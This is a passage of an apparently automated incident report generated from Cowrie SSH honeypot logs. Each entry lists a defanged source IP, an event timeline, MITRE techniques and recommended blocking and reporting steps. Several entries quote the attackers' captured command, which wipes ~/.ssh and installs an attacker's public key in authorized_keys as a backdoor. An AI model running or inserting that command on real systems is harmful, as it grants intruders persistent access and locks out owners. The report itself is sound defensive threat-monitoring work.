| `2026-05-26 06:22:02` | `cowrie.command.input` |
| `2026-05-26 06:22:02` | `cowrie.log.closed` |
| `2026-05-26 06:22:02` | `cowrie.session.params` |
| `2026-05-26 06:22:02` | `cowrie.command.input` |
| `2026-05-26 06:22:04` | `cowrie.log.closed` |
| `2026-05-26 06:22:04` | `cowrie.session.params` |
| `2026-05-26 06:22:04` | `cowrie.command.input` |
| `2026-05-26 06:22:04` | `cowrie.log.closed` |
| `2026-05-26 06:22:05` | `cowrie.session.params` |
| `2026-05-26 06:22:05` | `cowrie.command.input` |
| `2026-05-26 06:22:05` | `cowrie.log.closed` |
| `2026-05-26 06:22:06` | `cowrie.session.params` |
| `2026-05-26 06:22:06` | `cowrie.command.input` |
| `2026-05-26 06:22:06` | `cowrie.log.closed` |
| `2026-05-26 06:22:06` | `cowrie.session.params` |
| `2026-05-26 06:22:06` | `cowrie.command.input` |
| `2026-05-26 06:22:06` | `cowrie.log.closed` |
| `2026-05-26 06:22:07` | `cowrie.session.params` |
| `2026-05-26 06:22:07` | `cowrie.command.input` |
| `2026-05-26 06:22:07` | `cowrie.log.closed` |
| `2026-05-26 06:22:07` | `cowrie.session.params` |
| `2026-05-26 06:22:07` | `cowrie.command.input` |
| `2026-05-26 06:22:07` | `cowrie.log.closed` |
| `2026-05-26 06:22:08` | `cowrie.session.params` |
| `2026-05-26 06:22:08` | `cowrie.command.input` |
| `2026-05-26 06:22:08` | `cowrie.log.closed` |
| `2026-05-26 06:22:08` | `cowrie.session.params` |
| `2026-05-26 06:22:08` | `cowrie.command.input` |
| `2026-05-26 06:22:08` | `cowrie.log.closed` |
| `2026-05-26 06:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed79fac2f629

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-05-26 06:22 |
| **Last Seen** | 2026-05-26 06:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:22:56` | `cowrie.session.connect` |
| `2026-05-26 06:22:56` | `cowrie.client.version` |
| `2026-05-26 06:22:56` | `cowrie.client.kex` |
| `2026-05-26 06:22:56` | `cowrie.login.success` |
| `2026-05-26 06:22:57` | `cowrie.session.params` |
| `2026-05-26 06:22:57` | `cowrie.command.input` |
| `2026-05-26 06:22:57` | `cowrie.command.failed` |
| `2026-05-26 06:22:57` | `cowrie.log.closed` |
| `2026-05-26 06:22:57` | `cowrie.session.params` |
| `2026-05-26 06:22:57` | `cowrie.command.input` |
| `2026-05-26 06:22:57` | `cowrie.session.file_download` |
| `2026-05-26 06:22:57` | `cowrie.log.closed` |
| `2026-05-26 06:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea2794d30e30

| Field | Detail |
|---|---|
| **Source IP** | `118.145.102[.]69` |
| **First Seen** | 2026-05-26 06:22 |
| **Last Seen** | 2026-05-26 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:22:59` | `cowrie.session.connect` |
| `2026-05-26 06:22:59` | `cowrie.client.version` |
| `2026-05-26 06:22:59` | `cowrie.client.kex` |
| `2026-05-26 06:23:00` | `cowrie.login.success` |
| `2026-05-26 06:23:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.102[.]69` to AbuseIPDB if not already reported
- [ ] Block `118.145.102[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f49f94917cb

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-26 06:24 |
| **Last Seen** | 2026-05-26 06:24 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:24:22` | `cowrie.session.connect` |
| `2026-05-26 06:24:22` | `cowrie.client.version` |
| `2026-05-26 06:24:22` | `cowrie.client.kex` |
| `2026-05-26 06:24:23` | `cowrie.login.success` |
| `2026-05-26 06:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ee7e5f1200

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-26 06:24 |
| **Last Seen** | 2026-05-26 06:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:24:42` | `cowrie.session.connect` |
| `2026-05-26 06:24:42` | `cowrie.client.version` |
| `2026-05-26 06:24:43` | `cowrie.client.kex` |
| `2026-05-26 06:24:44` | `cowrie.login.success` |
| `2026-05-26 06:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f47e75f007

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-26 06:27 |
| **Last Seen** | 2026-05-26 06:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:27:10` | `cowrie.session.connect` |
| `2026-05-26 06:27:13` | `cowrie.client.version` |
| `2026-05-26 06:27:13` | `cowrie.client.kex` |
| `2026-05-26 06:27:14` | `cowrie.login.success` |
| `2026-05-26 06:27:15` | `cowrie.session.params` |
| `2026-05-26 06:27:15` | `cowrie.command.input` |
| `2026-05-26 06:27:15` | `cowrie.command.failed` |
| `2026-05-26 06:27:15` | `cowrie.log.closed` |
| `2026-05-26 06:27:16` | `cowrie.session.params` |
| `2026-05-26 06:27:16` | `cowrie.command.input` |
| `2026-05-26 06:27:16` | `cowrie.session.file_download` |
| `2026-05-26 06:27:16` | `cowrie.log.closed` |
| `2026-05-26 06:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c27efecdfe8f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.23[.]159` |
| **First Seen** | 2026-05-26 06:27 |
| **Last Seen** | 2026-05-26 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:27:22` | `cowrie.session.connect` |
| `2026-05-26 06:27:22` | `cowrie.client.version` |
| `2026-05-26 06:27:23` | `cowrie.client.kex` |
| `2026-05-26 06:27:26` | `cowrie.login.success` |
| `2026-05-26 06:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.23[.]159` to AbuseIPDB if not already reported
- [ ] Block `101.126.23[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3568f8469c52

| Field | Detail |
|---|---|
| **Source IP** | `120.48.147[.]81` |
| **First Seen** | 2026-05-26 06:28 |
| **Last Seen** | 2026-05-26 06:28 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:28:20` | `cowrie.session.connect` |
| `2026-05-26 06:28:20` | `cowrie.client.version` |
| `2026-05-26 06:28:20` | `cowrie.client.kex` |
| `2026-05-26 06:28:24` | `cowrie.login.success` |
| `2026-05-26 06:28:24` | `cowrie.session.params` |
| `2026-05-26 06:28:24` | `cowrie.command.input` |
| `2026-05-26 06:28:24` | `cowrie.command.failed` |
| `2026-05-26 06:28:24` | `cowrie.log.closed` |
| `2026-05-26 06:28:25` | `cowrie.session.params` |
| `2026-05-26 06:28:25` | `cowrie.command.input` |
| `2026-05-26 06:28:25` | `cowrie.session.file_download` |
| `2026-05-26 06:28:25` | `cowrie.log.closed` |
| `2026-05-26 06:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.147[.]81` to AbuseIPDB if not already reported
- [ ] Block `120.48.147[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5ea654209a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.147[.]81` |
| **First Seen** | 2026-05-26 06:28 |
| **Last Seen** | 2026-05-26 06:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:28:36` | `cowrie.session.connect` |
| `2026-05-26 06:28:36` | `cowrie.client.version` |
| `2026-05-26 06:28:36` | `cowrie.client.kex` |
| `2026-05-26 06:28:38` | `cowrie.login.success` |
| `2026-05-26 06:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.147[.]81` to AbuseIPDB if not already reported
- [ ] Block `120.48.147[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d0116d345bd

| Field | Detail |
|---|---|
| **Source IP** | `117.83.83[.]235` |
| **First Seen** | 2026-05-26 06:34 |
| **Last Seen** | 2026-05-26 06:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:34:43` | `cowrie.session.connect` |
| `2026-05-26 06:34:43` | `cowrie.client.version` |
| `2026-05-26 06:34:43` | `cowrie.client.kex` |
| `2026-05-26 06:34:43` | `cowrie.login.success` |
| `2026-05-26 06:34:47` | `cowrie.session.params` |
| `2026-05-26 06:34:47` | `cowrie.command.input` |
| `2026-05-26 06:34:47` | `cowrie.command.failed` |
| `2026-05-26 06:34:47` | `cowrie.log.closed` |
| `2026-05-26 06:34:47` | `cowrie.session.params` |
| `2026-05-26 06:34:47` | `cowrie.command.input` |
| `2026-05-26 06:34:47` | `cowrie.session.file_download` |
| `2026-05-26 06:34:47` | `cowrie.log.closed` |
| `2026-05-26 06:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.83.83[.]235` to AbuseIPDB if not already reported
- [ ] Block `117.83.83[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ff60da25a7

| Field | Detail |
|---|---|
| **Source IP** | `117.83.83[.]235` |
| **First Seen** | 2026-05-26 06:34 |
| **Last Seen** | 2026-05-26 06:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:34:50` | `cowrie.session.connect` |
| `2026-05-26 06:34:50` | `cowrie.client.version` |
| `2026-05-26 06:34:50` | `cowrie.client.kex` |
| `2026-05-26 06:34:51` | `cowrie.login.success` |
| `2026-05-26 06:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.83.83[.]235` to AbuseIPDB if not already reported
- [ ] Block `117.83.83[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f6750e9c2c

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:44 |
| **Last Seen** | 2026-05-26 06:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:44:27` | `cowrie.session.connect` |
| `2026-05-26 06:44:27` | `cowrie.client.version` |
| `2026-05-26 06:44:27` | `cowrie.client.kex` |
| `2026-05-26 06:44:28` | `cowrie.login.success` |
| `2026-05-26 06:44:28` | `cowrie.session.params` |
| `2026-05-26 06:44:28` | `cowrie.command.input` |
| `2026-05-26 06:44:28` | `cowrie.command.failed` |
| `2026-05-26 06:44:28` | `cowrie.log.closed` |
| `2026-05-26 06:44:28` | `cowrie.session.params` |
| `2026-05-26 06:44:28` | `cowrie.command.input` |
| `2026-05-26 06:44:28` | `cowrie.session.file_download` |
| `2026-05-26 06:44:28` | `cowrie.log.closed` |
| `2026-05-26 06:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92d593c9776e

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:44 |
| **Last Seen** | 2026-05-26 06:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:44:30` | `cowrie.session.connect` |
| `2026-05-26 06:44:30` | `cowrie.client.version` |
| `2026-05-26 06:44:30` | `cowrie.client.kex` |
| `2026-05-26 06:44:30` | `cowrie.login.success` |
| `2026-05-26 06:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de0f81e12c86

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:45 |
| **Last Seen** | 2026-05-26 06:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:45:21` | `cowrie.session.connect` |
| `2026-05-26 06:45:21` | `cowrie.client.version` |
| `2026-05-26 06:45:21` | `cowrie.client.kex` |
| `2026-05-26 06:45:21` | `cowrie.login.success` |
| `2026-05-26 06:45:21` | `cowrie.session.params` |
| `2026-05-26 06:45:21` | `cowrie.command.input` |
| `2026-05-26 06:45:21` | `cowrie.command.failed` |
| `2026-05-26 06:45:21` | `cowrie.log.closed` |
| `2026-05-26 06:45:21` | `cowrie.session.params` |
| `2026-05-26 06:45:21` | `cowrie.command.input` |
| `2026-05-26 06:45:22` | `cowrie.session.file_download` |
| `2026-05-26 06:45:22` | `cowrie.log.closed` |
| `2026-05-26 06:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d89664e95b

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:45 |
| **Last Seen** | 2026-05-26 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:45:23` | `cowrie.session.connect` |
| `2026-05-26 06:45:23` | `cowrie.client.version` |
| `2026-05-26 06:45:23` | `cowrie.client.kex` |
| `2026-05-26 06:45:23` | `cowrie.login.success` |
| `2026-05-26 06:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd955119c3e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:47 |
| **Last Seen** | 2026-05-26 06:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:47:05` | `cowrie.session.connect` |
| `2026-05-26 06:47:05` | `cowrie.client.version` |
| `2026-05-26 06:47:05` | `cowrie.client.kex` |
| `2026-05-26 06:47:07` | `cowrie.login.success` |
| `2026-05-26 06:47:07` | `cowrie.session.params` |
| `2026-05-26 06:47:07` | `cowrie.command.input` |
| `2026-05-26 06:47:07` | `cowrie.command.failed` |
| `2026-05-26 06:47:08` | `cowrie.log.closed` |
| `2026-05-26 06:47:08` | `cowrie.session.params` |
| `2026-05-26 06:47:08` | `cowrie.command.input` |
| `2026-05-26 06:47:09` | `cowrie.session.file_download` |
| `2026-05-26 06:47:09` | `cowrie.log.closed` |
| `2026-05-26 06:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b68ad41d48f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:47 |
| **Last Seen** | 2026-05-26 06:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:47:12` | `cowrie.session.connect` |
| `2026-05-26 06:47:12` | `cowrie.client.version` |
| `2026-05-26 06:47:12` | `cowrie.client.kex` |
| `2026-05-26 06:47:14` | `cowrie.login.success` |
| `2026-05-26 06:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-744e9ff1d653

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 06:47 |
| **Last Seen** | 2026-05-26 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
